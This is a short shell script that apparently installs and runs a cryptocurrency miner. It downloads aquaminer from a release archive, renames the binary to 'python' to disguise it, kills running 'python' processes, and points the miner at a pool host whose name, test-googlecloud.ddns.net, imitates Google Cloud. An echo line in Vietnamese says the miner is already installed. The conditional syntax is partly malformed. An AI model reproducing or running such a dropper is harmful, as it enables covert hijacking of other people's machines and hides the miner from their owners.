if [ -f ${PWD}/python ];
    if pgrep -x "python" > /dev/null then
        pkill python
        echo " kill process"
        ./python -F http://test-googlecloud.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/12

    
else
echo "Miner da install , chay thoi "
./python -F http://test-googlecloud.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/12     
fi
exit
fi
wget https://github.com/aquanetwork/aquachain/releases/download/1.5.5/aquaminer-0.4-linux-amd64.zip
unzip aquaminer-0.4-linux-amd64.zip
mv aquaminer-0.4-linux-amd64 python
./python -F http://test-googlecloud.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/12
exit 0
